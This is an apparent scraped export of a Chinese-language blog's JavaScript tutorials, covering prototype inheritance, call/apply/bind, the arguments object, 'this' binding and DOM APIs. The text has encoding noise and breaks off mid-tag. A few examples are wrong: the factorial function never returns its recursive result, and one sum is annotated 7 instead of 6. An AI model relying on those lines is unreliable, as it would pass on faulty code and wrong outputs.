&#123;　　　　Object.create = function (o) &#123;　　　　　　 function F() &#123;&#125;　　　　　　F.prototype = o;　　　　　　return new F();　　　　&#125;;　　&#125;\n\n类的继承\nObject.create()\nfunction Person(name, age)&#123;&#125;Person.prototype.headCount = 1;Person.prototype.eat = function()&#123;    console.log(&#x27;eating...&#x27;);&#125;function Programmer(name, age, title)&#123;&#125;Programmer.prototype = Object.create(Person.prototype); //建立继承关系Programmer.prototype.constructor = Programmer;  // 修改constructor的指向\n\n调用父类方法\nfunction Person(name, age)&#123;    this.name = name;    this.age = age;&#125;Person.prototype.headCount = 1;Person.prototype.eat = function()&#123;    console.log(&#x27;eating...&#x27;);&#125;function Programmer(name, age, title)&#123;    Person.apply(this, arguments); // 调用父类的构造器&#125;Programmer.prototype = Object.create(Person.prototype);Programmer.prototype.constructor = Programmer;Programmer.prototype.language = &quot;js&quot;;Programmer.prototype.work = function()&#123;    console.log(&#x27;i am working code in &#x27;+ this.language);    Person.prototype.eat.apply(this, arguments); // 调用父类上的方法&#125;\n\n封装\n命名空间\n\njs是没有命名空间的，因此可以用对象模拟\n\nvar app = &#123;&#125;;  // 命名空间app//模块1app.module1 = &#123;    name: &#x27;allin&#x27;,    f: function()&#123;        console.log(&#x27;hi robot&#x27;);    &#125;&#125;;app.module1.name; // &quot;allin&quot;app.module1.f();  // hi robot\n\n静态成员\nfunction Person(name)&#123;    var age = 100;    this.name = name;&#125;//静态成员Person.walk = function()&#123;    console.log(&#x27;static&#x27;);&#125;;Person.walk();  // static\n\n私有与公有\nfunction Person(id)&#123;    // 私有属性与方法    var name = &#x27;allin&#x27;;    var work = function()&#123;        console.log(this.id);    &#125;;    //公有属性与方法    this.id = id;    this.say = function()&#123;        console.log(&#x27;say hello&#x27;);        work.call(this);    &#125;;&#125;;var p1 = new Person(123);p1.name; // undefinedp1.id;  // 123p1.say();  // say hello 123\n\n模块化\nvar moduleA;moduleA = function() &#123;    var prop = 1;    function func() &#123;&#125;    return &#123;        func: func,        prop: prop    &#125;;&#125;(); // 立即执行匿名函数\n\n多态\n模拟方法重载\n\narguments属性可以取得函数调用的实参个数，可以利用这一点模拟方法的重载\n\nfunction demo(a, b )&#123;    console.log(demo.length); // 得到形参个数    console.log(arguments.length); //得到实参个数    console.log(arguments[0]);  // 第一个实参 4    console.log(arguments[1]);  // 第二个实参 5&#125;demo(4, 5, 6);//实现可变长度实参的相加function add()&#123;    var total = 0;    for( var i = arguments.length - 1; i &gt;= 0; i--)&#123;        total += arguments[i];    &#125;    return total;&#125;console.log(add(1));  // 1console.log(add(1, 2, 3));  // 7// 参数不同的情况function fontSize()&#123;    var ele = document.getElementById(&#x27;js&#x27;);    if(arguments.length == 0)&#123;        return ele.style.fontSize;    &#125;else&#123;        ele.style.fontSize = arguments[0];    &#125;&#125;fontSize(18);console.log(fontSize());// 类型不同的情况function setting()&#123;    var ele = document.getElementById(&#x27;js&#x27;);    if(typeof arguments[0] === &quot;object&quot;)&#123;        for(var p in arguments[0])&#123;            ele.style[p] = arguments[0][p];        &#125;    &#125;else&#123;        ele.style.fontSize = arguments[0];        ele.style.backgroundColor = arguments[1];    &#125;&#125;setting(18, &#x27;red&#x27;);setting(&#123;fontSize:20, backgroundColor: &#x27;green&#x27;&#125;);\n\n方法重写\nfunction F()&#123;&#125;var f = new F();F.prototype.run = function()&#123;    console.log(&#x27;F&#x27;);&#125;f.run(); // Ff.run = function()&#123;    console.log(&#x27;fff&#x27;);&#125;f.run();  // fff\n\n抽象类\n\n在构造器中 throw new Error(&#39;&#39;); 抛异常。这样防止这个类被直接调用\n\nfunction DetectorBase() &#123;    throw new Error(&#x27;Abstract class can not be invoked directly!&#x27;);&#125;DetectorBase.prototype.detect = function() &#123;    console.log(&#x27;Detection starting...&#x27;);&#125;;DetectorBase.prototype.stop = function() &#123;    console.log(&#x27;Detection stopped.&#x27;);&#125;;DetectorBase.prototype.init = function() &#123;    throw new Error(&#x27;Error&#x27;);&#125;;// var d = new DetectorBase();// Uncaught Error: Abstract class can not be invoked directly!function LinkDetector() &#123;&#125;LinkDetector.prototype = Object.create(DetectorBase.prototype);LinkDetector.prototype.constructor = LinkDetector;var l = new LinkDetector();console.log(l); //LinkDetector &#123;&#125;__proto__: LinkDetectorl.detect(); //Detection starting...l.init(); //Uncaught Error: Error","categories":["前端"],"tags":["javascript"]},{"title":"js-call apply bind","url":"/2017/12/16/html+css+js+ts/3-js-call+apply+bind/","content":"\ncall()、apply()、bind()都是函数对象的一个方法，它们的作用都是改变函数的调用对象。它的使用极大的简化了代码的调用\n\n一、方法定义\ncall方法\n语法\n\nfun.call(thisArg[, arg1[, arg2[, ...]]])\n\n\n&#96;&#96;&#96;thisArg：\nfun函数运行时指定的\nthis  值，可能的值为：  - 不传，或者传`null`，`undefined`， `this`指向`window`对象  - 传递另一个函数的函数名`fun2`，`this`指向函数fun2的引用    值为原始值(数字，字符串，布尔值),this会指向该原始值的自动包装对象，如 String、Number、Boolean  - 传递一个对象，函数中的`this`指向这个对象- **apply方法**- 语法：`apply([thisObj[,argArray]])`  - 定义：应用某一对象的一个方法，用另一个对象替换当前对象。  - 说明：`apply`的第一个参数`thisObj`和`call`方法的一样，第二个参数`argArray`为一个传参数组`thisObj`如果未传，那么 `Global`对象被用作 `thisObj`- **bind方法**  - 在`ECMAScript5`中扩展了叫`bind`的方法（`IE6,7,8`不支持）  - 语法：`bind([thisObj[,arg1[, arg2[, [,.argN]]]]])`  - 定义：应用某一对象的一个方法，用另一个对象替换当前对象。  - 说明：`bind`的`thisObj`参数也和`call`方法一样，`thisObj`如果未传，那么 `Global`对象被用作 `thisObj`。arg1 … argN可传可不传。如果不传，可以在调用的时候再传。如果传了，调用的时候则可以不传，调用的时候如果你还是传了，则不生效\nvar person &#x3D; {  name:”tsrot”,  age:24,  sayHello:function(age){  console.log(this.name);  console.log(age);  }  };var son &#x3D; { name:”xieliqun” };var boundFunc &#x3D; person.sayHello.bind(son);boundFunc(25);var boundFunc &#x3D; person.sayHello.bind(son,25);boundFunc();var boundFunc &#x3D; person.sayHello.bind(son,25);boundFunc(30);#### 二、call、apply、bind的区别- `call`的`arg`传参需一个一个传，`apply`则直接传一个数组\nfunction hello(name,age){ console.log(name);console.log(age);}hello.call(this,”tsrot”,24);hello.apply(this,[“tsrot”,24]);- `call`和`apply`直接执行函数，而`bind`需要再一次调用\nvar obj &#x3D; {  x: 81,  };var foo &#x3D; {  getX: function() {  return this.x;  }  }console.log(foo.getX.bind(obj)());console.log(foo.getX.call(obj));console.log(foo.getX.apply(obj));#### 三、运用场景- 实现继承\nfunction Animal(name) {this.name &#x3D; name;this.showName &#x3D; function () {  console.log(this.name);}}function Cat(name) {Animal.call(this, name);}var cat &#x3D; new Cat(‘Black Cat’);cat.showName();- 数组追加\nvar array1 &#x3D; [1 , 2 , 3, 5];var array2 &#x3D; [“xie” , “li” , “qun” , “tsrot”];Array.prototype.push.apply(array1, array2);console.log(array1);- 获取数组中的最大值和最小值\nvar num &#x3D; [1,3,5,7,2,-10,11];var maxNum &#x3D; Math.max.apply(Math, num);var minNum &#x3D; Math.min.apply(Math, num);console.log(maxNum);console.log(minNum);- 将伪数组转化为数组\nvar fakeArr &#x3D; {0:’a’,1:’b’,length:2};var arr1 &#x3D; Array.prototype.slice.call(fakeArr);console.log(arr1[0]);var arr2 &#x3D; [].slice.call(fakeArr);console.log(arr2[0]);arr1.push(“c”);console.log(arr1);- 保存this变量\nvar foo &#x3D; {  bar : 1,  eventBind: function(){  var _this &#x3D; this ;  $(‘.someClass’).on(‘click’,function(event) {      console.log(_this.bar);  });  }  }var foo &#x3D; {  bar : 1,  eventBind: function(){  $(‘.someClass’).on(‘click’,function(event) {      console.log(this.bar);  }.bind(this));  }  }\n\n&#96;&#96;&#96;\n","categories":["前端"],"tags":["javascript"]},{"title":"js-arguments对象","url":"/2017/12/15/html+css+js+ts/3-js-arguments/","content":"每个函数都会有一个Arguments对象实例arguments，它引用着函数的实参，可以用数组下标的方式”[]”引用arguments的元素。arguments.length为函数实参个数，arguments.callee引用函数自身。\nArguments对象介绍Arguments对象是一个伪数组对象，它有length属性，可以arguments[i]来访问对象中的元素，但它不能用数组的一些方法，例如push，pop，slice等。\nArguments的length属性Arguments的length属性，表示function函数实际所传参数的个数。函数名点length可以获取函数期望的传参个数。\nfunction argTest(a,b,c)&#123;\tvar t = arguments.length; //实际传参个数\tvar e = argTest.length;   //期望传参个数\tconsole.log(t);\tconsole.log(e);&#125;argTest(11,12);       //t=2,e=3argTest(11,12,13);    //t=3,e=3argTest(11,12,13,14); //t=4,e=3\n\nArguments的参数访问Arguments对象的参数访问可以用arguments[i]来访问函数所传的参数。\nfunction argTest(a,b,c)&#123;\tvar arg = [];\tfor(var i=0;i&lt;arguments.length;i++)&#123;\t\targ.push(arguments[i]);\t&#125;\tconsole.log(arg);&#125;argTest(11,12);       //[11, 12]argTest(11,12,13);    //[11, 12, 13]argTest(11,12,13,14); //[11, 12, 13, 14]\n\nArguments的callee调用Arguments的callee属性可以调用函数本身，当函数正在执行时才可调用，可以实现方法的递归调用。\nfunction argTest(a,b,c)&#123;\tvar e = arguments.callee.toString();\tconsole.log(e);&#125;argTest(); //打印出函数本身\n\nFunction对象caller属性Function对象的caller属性可以指向当前函数的调用者，当调用者函数正在执行时才可调用，\nfunction callerTest()&#123;\tif(callerTest.caller)&#123;\t\tvar caller = callerTest.caller.toString();\t\tconsole.log(caller);\t&#125;else&#123;\t\tconsole.log(&quot;no caller&quot;)\t&#125;&#125;function handler()&#123;\tcallerTest();&#125;function handlerToHandler()&#123;\thandler();&#125;callerTest();        //no callerhandler();           //返回调用者handler函数handlerToHandler();  //返回调用者handler函数\n\nArguments的作用方法重载方法重载是指在一个类中定义多个同名的方法，但要求每个方法具有不同的参数的类型或参数的个数。Javascript并没有重载函数的功能，但是Arguments对象能够模拟重载。\n//普通方法实现方法重载function test(a,b,c)&#123;\tif(a &amp;&amp; b &amp;&amp; c)&#123;\t\tconsole.log(a + b + c);\t&#125;else if(a &amp;&amp; b)&#123;\t\tconsole.log(a + b);\t&#125;else&#123;\t\tconsole.log(a);\t&#125;&#125;test();           //undefinedtest(11,12);      //23test(11,12,13)    //36//Arguments对象实现方法重载function test()&#123;\tvar sum = 0;\tfor(var i=0;i&lt;arguments.length;i++)&#123;\t\tsum += arguments[i];\t&#125;\tconsole.log(sum);&#125;test();          //0test(11,12);     //23test(11,12,13);  //36//ES6实现方法重载function test(...nums)&#123;\tvar sum = 0;\tfor(var i=0;i&lt;nums.length;i++)&#123;\t\tsum += nums[i];\t&#125;\tconsole.log(sum);&#125;test();          //0test(11,12);     //23test(11,12,13);  //36\n\n递归调用这样的好处就是可以实现匿名函数的递归调用。\n//实现一个阶乘函数function factorial(n)&#123;\tif(n == 1)&#123;\t\treturn 1;\t&#125;else&#123;\t\tn * arguments.callee(n-1);\t&#125;&#125;factorial(1); //1factorial(5); //120\n\n不定参问题比如说，我想判断你传给我的一些数字的大小，取出最大的那个\nfunction max()&#123;\tvar maxNum = Number.NEGATIVE_INFINITY;;\tfor(var i=0;i&lt;arguments.length;i++)&#123;\t\tif(arguments[i]&gt; maxNum)&#123;\t\t\tmaxNum = arguments[i];\t\t&#125;\t&#125;\treturn maxNum;&#125;max(1,2,3,11,4,10); //11max(2,-10,22,11);   //22","categories":["前端"],"tags":["javascript"]},{"title":"js-OOP类与对象","url":"/2017/12/29/html+css+js+ts/3-js-OOP%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/","content":"对象\n对象的含义\n所谓对象，就是一种无序的数据集合，由若干个“键值对”（key-value）构成\n对象的创建\n使用new运算符创建Object\n\n\nvar p = new Object();p.name = &quot;Tony&quot;;\n\n\n使用对象字面量的形式\n\n//对象字面量形式var p =&#123;    name: &quot;tony&quot;,    work: function()&#123;        console.log(&quot;working....&quot;);    &#125;,    _age: 18,    get age()&#123;        return this._age;    &#125;,    set age(val)&#123;        if( val &lt;0 || val &gt; 150)&#123;            throw new Error(&quot;invalid value&quot;);        &#125;else&#123;            this._age = val;        &#125;    &#125;&#125;console.log(p.name);\n\n对象的基本操作\n成员属性的添加\n\n// Object.defineProperty()方法Object.defineProperty(p, &quot;age&quot;,&#123;value: 18, writable: false&#125;);//Object.defineProperties()方法 添加多个属性Object.defineProperties(p, &#123;    salary:&#123;        value: 1000,        writable: false    &#125;,    gender:&#123;        value: true    &#125;&#125;);\n\n\n成员的遍历\n使用 for..in语句\nObject.keys()方法 返回一个包含对象键名的字符串数组\n\n\n\nvar o =&#123;&#125;;o.name = &quot;jack&quot;;o.age = 20;for(var i in o)&#123;    console.log(o[i]);&#125; // jack, 20Object.keys(o); // [&quot;name&quot;, &quot;age&quot;]\n\n\n检查对象是否有某个属性\nin 操作符\nObject.hasOwnProperty()方法\n\n\n\nvar o = &#123;name: &quot;mariya&quot;&#125;&quot;name&quot; in o; // trueo.hasOwnProperty(&quot;name&quot;); // true\n\n\n得到对象的属性特性描述 Object.getOwnPropertyDescriptor(obj,property)\n\nObject.getOwnPropertyDescriptor(o, &quot;name&quot;);//Object &#123;//    value: &quot;mariya&quot;, writable: true, enumerable: true, configurable: true&#125;\n\n\n删除属性\ndelete运算符,但有些对象的属性是删除不了的\n\n\n\ndelete o.name; //trueo.name;  // undefined\n\nConstructor属性\nconstructor始终指向创建当前对象的构造函数\n\nvar arr = [];console.log(arr.constructor === Array); // truevar Foo = function() &#123;&#125;;console.log(Foo.constructor === Function); // true// 由构造函数实例化一个obj对象var obj = new Foo();console.log(obj.constructor === Foo); // trueconsole.log(obj.constructor.constructor === Function); // true\n\n\n每个函数都有一个默认的属性prototype，而这个prototype的constructor默认指向这个函数\n\n类的创建\n\n虽然js是门基于对象的语言，但是没有类这一概念的，虽然保留了class的关键字，但在ES6之前是无法使用的。所以，可以用构造函数模拟类的创建，也就是伪类。\n所谓”构造函数”，其实就是一个普通函数，但是内部使用了this变量。对构造函数使用new运算符，就能生成实例，并且this变量会绑定在实例对象上\n每一个构造函数都有一个prototype属性，指向另一个对象。这个对象的所有属性和方法，都会被构造函数的实例继承\n\n//构造函数模式function Person(age, name)&#123; //Class    this.age = age;    this.name = name;&#125;//将公共的属性或方法放在prototype属性上Person.prototype.headCount = 1;//创建实例对象var p = new Person(19, &#x27;johnsom&#x27;);var p1 = new Person(20, &#x27;allen&#x27;);\n\nthis\n\nthis表示当前对象，如果在全局作用范围内使用this，则指代当前页面对象window； 如果在函数中使用this，则this指代什么是根据运行时此函数在什么对象上被调用。 我们还可以使用apply和call两个全局方法来改变函数中this的具体指向\n\n全局代码中的thisconsole.log(this === window); //true 全局范围内使用this指向window对象\n\n普通的函数调用function f()&#123;this.name = &quot;tony&quot;; // this在运行时指向window对象,在严格模式下则是undefined&#125;\n\n在对象中使用var o = &#123;    name: &quot;tony&quot;,    print: function()&#123;        console.log(this.name);  //this指向对象o，但是可以改变其指向    &#125;&#125;;\n\n作为构造函数new F(); // 函数内部的this指向新创建的对象。\n\n多层嵌套的内部函数var name = &quot;global&quot;;var person = &#123;    name : &quot;person&quot;,    hello : function(sth)&#123;        var sayhello = function(sth) &#123;            console.log(this.name + &quot; says &quot; + sth);        &#125;;        sayhello(sth);    &#125;&#125;person.hello(&quot;hello world&quot;);//global says hello world\n\n\n在内部函数中，this没有按预想的绑定到外层函数对象上，而是绑定到了全局对象。这里普遍被认为是JavaScript语言的设计错误，因为没有人想让内部函数中的this指向全局对象。一般的处理方式是将this作为变量保存下来，一般约定为that或者self：\n\nvar name = &quot;global&quot;;var person = &#123;    name : &quot;person&quot;,    hello : function(sth)&#123;        var that = this;        var sayhello = function(sth) &#123;            console.log(that.name + &quot; says &quot; + sth);        &#125;;        sayhello(sth);    &#125;&#125;person.hello(&quot;hello world&quot;);//person says hello world\n\n事件中的thisvar ele = document.getElementById(&quot;id&quot;);ele.addEventListener(&#x27;click&#x27;,function()&#123;    console.log(this);  //this指向dom元素&#125;);\n\n使用apply和call改变this的指向\napply和call类似，只是后面的参数是通过一个数组传入，而不是分开传入。两者都是将某个函数绑定到某个具体对象上使用，自然此时的this会被显式的设置为第一个参数。两者的方法定义：\n\ncall( thisArg [，arg1，arg2，… ] );  // 参数列表，arg1，arg2，...apply(thisArg [，argArray] );     // 参数数组，argArrayvar name = &#x27;global&#x27;;var o = &#123;    name: &#x27;job&#x27;,    getName: function()&#123;        console.log(this.name);    &#125;&#125;;o.getName(); // job//用call或apply改变函数中this的指向o.getName.call(this); // global\n\n\n简单的总结：\n当函数作为对象的方法调用时，this指向该对象。\n构造函数中的this指向新创建的对象\n嵌套函数中的this不会继承上层函数的this，如果需要，可以用一个变量保存上层函数的this\n\n\n\nbind（）\n该方法创建一个新函数，称为绑定函数，绑定函数会以创建它时传入bind方法的第一个参数作为this，传入bind方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数.\n\n$(&quot;#ele&quot;).click(person.hello.bind(person));//相应元素被点击时，输出person says hello world","categories":["前端"],"tags":["javascript"]},{"title":"js-domapi(全)","url":"/2017/12/19/html+css+js+ts/3-js-dom-api(%E5%85%A8)/","content":"一、基本类型介绍1.1 Node类型\nDOM1级定义了一个Node接口，该接口由DOM中所有节点类型实现。这个Node接口在JS中是作为Node类型实现的。在IE9以下版本无法访问到这个类型，JS中所有节点都继承自Node类型，都共享着相同的基本属性和方法\n\nNode有一个属性nodeType表示Node的类型，它是一个整数，其数值分别表示相应的Node类型\n\n假设我们要判断一个Node是不是元素，我们可以这样判断\n\n\nif(someNode.nodeType == 1)&#123;console.log(&quot;Node is a element&quot;);&#125;\n\n\n这些Node类型中，我们最常用的就是element，text，attribute，comment，document，document_fragment这几种类型\n\n1.2 Element类型\nElement提供了对元素标签名，子节点和特性的访问，我们常用HTML元素比如div，span，a等标签就是element中的一种。\nElement有下面几条特性：\nnodeType为1\nnodeName为元素标签名，tagName也是返回标签名\nnodeValue为null\nparentNode可能是Document或Element\n子节点可能是 Element，Text，Comment，Processing_Instruction，CDATASection 或 EntityReference\n\n\n\n1.3 Text类型\n&#96;&#96;&#96;Text表示文本节点，它包含的是纯文本内容，不能包含html代码，但可以包含转义后的html代码。\nText有下面的特性：    - `nodeType`为`3`  - `nodeName`为`#text`  - `nodeValue`为文本内容  - `parentNode`是一个`Element`  - 没有子节点##### 1.4 Attr类型- ```  Attr类型表示元素的特性，相当于元素的attributes属性中的节点，它有下面的特性：\n\n\nnodeType值为2\nnodeName是特性的名称\nnodeValue是特性的值\nparentNode为null\n\n\n\n1.5 Comment类型\n\n&#96;&#96;&#96;Comment表示HTML文档中的注释，它有下面的几种特征：  - `nodeType`为8  - `nodeName`为`#comment`  - `nodeValue`为注释的内容  - `parentNode`可能是`Document`或`Element`  - 没有子节点##### 1.6 Document------![img](http://7xq6al.com1.z0.glb.clouddn.com/d6.png)- ```  Document表示文档，在浏览器中，document对象是HTMLDocument的一个实例，表示整个页面，它同时也是window对象的一个属性。\n\nDocument有下面的特性：\n\n\nnodeType为9\nnodeName为#document\nnodeValue为 null\nparentNode为 null\n子节点可能是一个DocumentType或Element\n\n\n\n1.7 DocumentFragment类型\n\nDocumentFragment是所有节点中唯一一个没有对应标记的类型，它表示一种轻量级的文档，可能当作一个临时的仓库用来保存可能会添加到文档中的节点。DocumentFragment有下面的特性：\nnodeType为11\nnodeName为#document-fragment\nnodeValue为null\nparentNode为null\n\n\n我们简单地介绍了几种常见的Node类型，要记住，HTML中的节点并不只是包括元素节点，它还包括文本节点，注释节点等等。在这里我们只是简单地说明了几种常见的节点.\n\n二、 DOM提供的几个属性\n2.1 childNodes属性\n\n在一棵节点树上，childNodes属性可以用来获取任何一个元素的所有子节点，它是一个包含这个元素全部子元素的数组\n\nelement.childNodes\n\n2.2 nodeType属性\n\n节点之间的关系构成了节点层次，html 页面的可以画出一个以html标签为根节点的树形结构DOM 会把文档看作是一棵树，同时定义了很多方法来操作这棵数中的每一个元素（节点）\n\n&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;hello world!!!&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\n每一个节点都有nodeType属性\n\nnode.nodeType\n\n\n&#96;&#96;&#96;nodeType属性总共有12中可能取值，但其中仅有3种有实用价值- 元素节点的`nodeType`属性值是1- 属性节点的`nodeType`属性值是2- 文本节点的`nodeType`属性值是3\ndescription.firstChild.nodeValue &#x3D; text;#### 2.3 nodeValue属性------- ```  nodeValue属性\n\n\n如果想改变一个文本节点的值，那就使用DOM提供的nodeValue,它用来得到一个节点的值 node.nodeValue\n需要注意：nodeValue属性获取对象的值时，得到的并不是包含在这个段落里的文本\nnodeValue属性不仅可以用来检测节点的值，还可以设置节点的值\n\n\n\n2.4 firstChild和lastChild属性\n\n数组元素childNodes[0]有个更直观的同义词。无论如何，只要访问childNodes数组的第一个元素，都可以把它写成firstChild\n\nnode.firstChild\n\n与下面等价\nnode.childNodes[0]\n\n\nDOM还提供了一个与之对应的lastChild属性\n\nnode.lastChild\n\n三、节点创建型API\n\n在这里，我将常用的DOM操作api进行分类，首先要介绍的是创建型的api。这一类型的api，简而言之就是用来创建节点的\n\n3.1 createElement\n\ncreateElement通过传入指定的一个标签名来创建一个元素，如果传入的标签名是一个未知的，则会创建一个自定义的标签，注意：IE8以下浏览器不支持自定义标签\n\nvar div = document.createElement(&quot;div&quot;);\n\n\n使用createElement要注意：通过createElement创建的元素并不属于html文档，它只是创建出来，并未添加到html文档中，要调用appendChild或insertBefore等方法将其添加到HTML文档树中\n\n3.2 createTextNode\n\ncreateTextNode用来创建一个文本节点，用法如下\n\nvar textNode = document.createTextNode(&quot;一个TextNode&quot;);\n\n\ncreateTextNode接收一个参数，这个参数就是文本节点中的文本，和createElement一样，创建后的文本节点也只是独立的一个节点，同样需要appendChild将其添加到HTML文档树中\n\n3.3 cloneNode\ncloneNode是用来返回调用方法的节点的一个副本，它接收一个bool参数，用来表示是否复制子元素，使用如下：\n\nvar parent = document.getElementById(&quot;parentElement&quot;); var parent2 = parent.cloneNode(true);// 传入trueparent2.id = &quot;parent2&quot;;\n\n\n这段代码通过cloneNode复制了一份parent元素，其中cloneNode的参数为true，表示parent的子节点也被复制，如果传入false，则表示只复制了parent节点\n\n&lt;div id=&quot;parent&quot;&gt;    我是父元素的文本    &lt;br/&gt;    &lt;span&gt;        我是子元素    &lt;/span&gt;&lt;/div&gt;&lt;button id=&quot;btnCopy&quot;&gt;复制&lt;/button&gt;var parent = document.getElementById(&quot;parent&quot;);document.getElementById(&quot;btnCopy&quot;).onclick = function()&#123;\tvar parent2 = parent.cloneNode(true);\tparent2.id = &quot;parent2&quot;;\tdocument.body.appendChild(parent2);&#125;\n\n\n这段代码很简单，主要是绑定button事件，事件内容是复制了一个parent，修改其id，然后添加到文档中\n这里有几点要注意：\n和createElement一样，cloneNode创建的节点只是游离有html文档外的节点，要调用appendChild方法才能添加到文档树中\n如果复制的元素有id，则其副本同样会包含该id，由于id具有唯一性，所以在复制节点后必须要修改其id\n调用接收的bool参数最好传入，如果不传入该参数，不同浏览器对其默认值的处理可能不同\n\n\n除此之外，我们还有一个需要注意的点：\n如果被复制的节点绑定了事件，则副本也会跟着绑定该事件吗？这里要分情况讨论：\n如果是通过addEventListener或者比如onclick进行绑定事件，则副本节点不会绑定该事件\n如果是内联方式绑定比如\n\n\n\n\n\n&lt;div onclick=&quot;showParent()&quot;&gt;&lt;/div&gt;\n\n\n这样的话，副本节点同样会触发事件\n\n3.4 createDocumentFragment\n\ncreateDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中\ncreateDocumentFragment方法主要是用于添加大量节点到文档中时会使用到。假设要循环一组数据，然后创建多个节点添加到文档中\n\n&lt;ul id=&quot;list&quot;&gt;&lt;/ul&gt;&lt;input type=&quot;button&quot; value=&quot;添加多项&quot; id=&quot;btnAdd&quot; /&gt;document.getElementById(&quot;btnAdd&quot;).onclick = function()&#123;\tvar list = document.getElementById(&quot;list&quot;);\tfor(var i = 0;i &lt; 100; i++)&#123;\t\tvar li = document.createElement(&quot;li&quot;);\t\tli.textContent = i;\t\tlist.appendChild(li);\t&#125;&#125;\n\n\n这段代码将按钮绑定了一个事件，这个事件创建了100个li节点，然后依次将其添加HTML文档中。这样做有一个缺点：每次一创建一个新的元素，然后添加到文档树中，这个过程会造成浏览器的回流。所谓回流简单说就是指元素大小和位置会被重新计算，如果添加的元素太多，会造成性能问题。这个时候，就是使用createDocumentFragment了\nDocumentFragment不是文档树的一部分，它是保存在内存中的，所以不会造成回流问题。我们修改上面的代码如下\n\ndocument.getElementById(&quot;btnAdd&quot;).onclick = function()&#123;\tvar list = document.getElementById(&quot;list&quot;);\t\tvar fragment = document.createDocumentFragment();\tfor(var i = 0;i &lt; 100; i++)&#123;\t  var li = document.createElement(&quot;li&quot;);\t\tli.textContent = i;\t\tfragment.appendChild(li);\t&#125;\tlist.appendChild(fragment);&#125;\n\n\n优化后的代码主要是创建了一个fragment，每次生成的li节点先添加到fragment，最后一次性添加到list\n\n3.5 创建型API总结\n\n创建型api主要包括createElement，createTextNode，cloneNode和createDocumentFragment四个方法，需要注意下面几点：\n它们创建的节点只是一个孤立的节点，要通过appendChild添加到文档中\ncloneNode要注意如果被复制的节点是否包含子节点以及事件绑定等问题\n使用createDocumentFragment来解决添加大量节点时的性能问题\n\n\n\n四、页面修改型API\n\n前面我们提到创建型api，它们只是创建节点，并没有真正修改到页面内容，而是要调用appendChild来将其添加到文档树中。我在这里将这类会修改到页面内容归为一类。修改页面内容的api主要包括：appendChild，insertBefore，removeChild，replaceChild\n\n4.1 appendChild\n\nappendChild我们在前面已经用到多次，就是将指定的节点添加到调用该方法的节点的子元素的末尾。调用方法如下：\n\nparent.appendChild(child);\n\n\nchild节点将会作为parent节点的最后一个子节点\nappendChild这个方法很简单，但是还有有一点需要注意：如果被添加的节点是一个页面中存在的节点，则执行后这个节点将会添加到指定位置，其原本所在的位置将移除该节点，也就是说不会同时存在两个该节点在页面上，相当于把这个节点移动到另一个地方\n\n&lt;div id=&quot;child&quot;&gt;    要被添加的节点&lt;/div&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;div id=&quot;parent&quot;&gt;    要移动的位置&lt;/div&gt;\t\t&lt;input id=&quot;btnMove&quot; type=&quot;button&quot; value=&quot;移动节点&quot; /&gt;document.getElementById(&quot;btnMove&quot;).onclick = function()&#123;\tvar child = document.getElementById(&quot;child&quot;);\tdocument.getElementById(&quot;parent&quot;).appendChild(child);&#125;\n\n\n这段代码主要是获取页面上的child节点，然后添加到指定位置，可以看到原本的child节点被移动到parent中了。这里还有一个要注意的点：如果child绑定了事件，被移动时，它依然绑定着该事件\n\n4.2 insertBefore\n\ninsertBefore用来添加一个节点到一个参照节点之前，用法如下\n\nparentNode.insertBefore(newNode,refNode);\n\n\nparentNode表示新节点被添加后的父节点\nnewNode表示要添加的节点\nrefNode表示参照节点，新节点会添加到这个节点之前\n\n&lt;div id=&quot;parent&quot;&gt;    父节点    &lt;div id=&quot;child&quot;&gt;\t\t\t\t        子元素    &lt;/div&gt;&lt;/div&gt;&lt;input type=&quot;button&quot; id=&quot;insertNode&quot; value=&quot;插入节点&quot; /&gt;var parent = document.getElementById(&quot;parent&quot;);var child = document.getElementById(&quot;child&quot;);document.getElementById(&quot;insertNode&quot;).onclick = function()&#123;\tvar newNode = document.createElement(&quot;div&quot;);\tnewNode.textContent = &quot;新节点&quot;\tparent.insertBefore(newNode,child);&#125;\n\n\n这段代码创建了一个新节点，然后添加到child节点之前\n和appendChild一样，如果插入的节点是页面上的节点，则会移动该节点到指定位置，并且保留其绑定的事件。\n关于第二个参数参照节点还有几个注意的地方：\nrefNode是必传的，如果不传该参数会报错\n如果refNode是undefined或null，则insertBefore会将节点添加到子元素的末尾\n\n\n\n4.3 removeChild\n\nremoveChild顾名思义，就是删除指定的子节点并返回，用法如下\n\nvar deletedChild = parent.removeChild(node);\n\n\ndeletedChild指向被删除节点的引用，它等于node，被删除的节点仍然存在于内存中，可以对其进行下一步操作。\n注意：如果被删除的节点不是其子节点，则程序将会报错。我们可以通过下面的方式来确保可以删除：\n\nif(node.parentNode)&#123;    node.parentNode.removeChild(node);&#125;\n\n\n通过节点自己获取节点的父节点，然后将自身删除\n\n4.4 replaceChild\n\nreplaceChild用于使用一个节点替换另一个节点，用法如下\n\nparent.replaceChild(newChild,oldChild);\n\n\nnewChild是替换的节点，可以是新的节点，也可以是页面上的节点，如果是页面上的节点，则其将被转移到新的位置\noldChild是被替换的节点\n\n4.5 页面修改型API总结\n\n页面修改型api主要是这四个接口，\n要注意几个特点\n：\n\n不管是新增还是替换节点，如果新增或替换的节点是原本存在页面上的，则其原来位置的节点将被移除，也就是说同一个节点不能存在于页面的多个位置\n节点本身绑定的事件会不会消失，会一直保留着\n\n\n\n五、节点查询型API\n\n节点查询型API也是非常常用的\n\n5.1 document.getElementById\n\n这个接口很简单，根据元素id返回元素，返回值是Element类型，如果不存在该元素，则返回null\n使用这个接口有几点要注意：\n元素的Id是大小写敏感的，一定要写对元素的id\nHTML文档中可能存在多个id相同的元素，则返回第一个元素\n只从文档中进行搜索元素，如果创建了一个元素并指定id，但并没有添加到文档中，则这个元素是不会被查找到的\n\n\n\n5.2 document.getElementsByTagName\n\n这个接口根据元素标签名获取元素，返回一个即时的HTMLCollection类型，什么是即时的HTMLCollection类型呢？\n\n&lt;div&gt;div1&lt;/div&gt;&lt;div&gt;div2&lt;/div&gt;\t\t&lt;input type=&quot;button&quot; 